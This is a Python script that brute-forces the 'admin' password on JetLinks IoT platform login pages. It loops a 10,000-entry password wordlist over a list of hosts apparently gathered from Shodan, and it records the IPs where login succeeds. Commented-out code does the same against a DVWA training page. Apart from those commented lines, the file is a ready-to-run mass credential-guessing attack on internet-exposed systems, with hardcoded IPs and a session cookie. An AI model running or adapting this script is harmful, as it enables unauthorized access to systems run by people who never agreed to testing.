import requests
import re
import json

headers = {
    "Cookie": "security=low; PHPSESSID=dspqpd9s5b32u1tc6c4j5ind4c"
}


ip = "101.34.143.5:8888"  # localhost
# url = "http://101.34.143.5:8888/vulnerabilities/brute/?username=admin&password=password&Login=Login"


url = "http://192.168.19.185:9000/jetlinks/authorize/login"
# res = requests.get(url,headers=headers)

def test_vun(ip,passdir=''):
    url="http://{}/jetlinks/authorize/login".format(ip)

    with open('./somd5-top1w.txt', 'r') as f:
        lines = f.readlines()
        for index,line in enumerate(lines):
            password = line.strip('\n')
            json = {"username": "admin", "password": password, "expires": 3600000,
                    "tokenType": "default", "verifyKey": "",
                    "verifyCode": ""}
            try:
                resp = requests.post(url, json=json,timeout=5)
            except requests.ConnectionError as e:
                print(e)
                return False
            except Exception as e:
                print(e)
                return False
            if resp.status_code==404:
                return False
            if resp.status_code==400 and '验证码' in resp.text:
                return False
            if '密码' in resp.text:
                if index%100==0: print('{} password incorrect,retrying {}'.format(ip,index))
                continue
            if resp.status_code==200:
                return {'ip':ip,'password':password}
            else:
                print(resp.text)
                return False
            print(resp.json())
    return False



# fileusernames = open("names.txt","r")
# usernames = fileusernames.readlines()
# filepasswords = open("dict.txt","r")
# passwords = filepasswords.readlines()
#
# for username in usernames:
#     for password in passwords:
#         response = requests.get(url+"?username="+username[:-1]+"&password="+password[:-1]+"&Login=Login", headers=headers) # low & medium #
#         if not re.findall("Username and/or password incorrect", response.text):
#             print(username[:-1]+":"+password[:-1])
def main():
    print('a')
    success_ip=[]
    with open('./data/jetlinks_shodan_ip.json', 'r') as f:
        ip_li = json.load(f)
        for ip in ip_li:
            if test_vun(ip):
                success_ip.append(ip)
                print('{} success'.format(ip))
            else:
                print('{} failed'.format(ip))
    with open('./data/res.json','w') as f:
        print('total success{}'.format(len(success_ip)))
        json.dump(success_ip,f)
if __name__ == '__main__':
    main()